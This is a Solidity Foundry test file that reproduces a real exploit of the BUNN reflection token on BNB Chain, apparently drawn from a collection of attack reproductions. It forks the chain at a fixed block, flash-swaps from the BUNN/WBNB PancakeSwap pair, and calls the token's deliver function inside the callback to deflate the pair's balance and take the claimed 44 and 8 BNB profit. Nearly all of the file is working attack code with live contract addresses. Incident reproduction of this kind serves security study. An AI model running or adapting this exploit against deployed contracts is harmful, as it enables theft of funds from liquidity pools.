// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/DecurityHQ/status/1671803688996806656
// @TX
// https://bscscan.com/tx/0x24a68d2a4bbb02f398d3601acfd87b09f543d935fc24862c314aaf64c295acdb
// @Summary
// Reelection token,call deliver function to decrease pairs token balance,and swap to get the profit.

interface Bunn is IERC20 {
    function deliver(uint256 tAmount) external;
}

contract ContractTest is Test {
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Bunn constant BUNN = Bunn(0xc54AAecF5fA1b6c007d019a9d14dFb4a77CC3039);
    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair constant Bunn_Wbnb_Poll = IPancakePair(0xb4B84375Ae9bb94d19F416D3db553827Be349520);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() external {
        cheats.createSelectFork("bsc", 29_304_627);
    }

    function testExploit() external {
        Bunn_Wbnb_Poll.swap(44 ether, 1_000_000_000_000, address(this), "0x0"); //44 bnb profit
        Bunn_Wbnb_Poll.swap(8 ether, 1_000_000_000_000, address(this), "0x0"); // 8 bnb profit

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        console.log("Before deliver,pair bunn balance:", BUNN.balanceOf(address(Bunn_Wbnb_Poll)));
        BUNN.deliver(990_000_000_000);
        console.log("After deliver,pair bunn balance:", BUNN.balanceOf(address(Bunn_Wbnb_Poll)));
    }
}
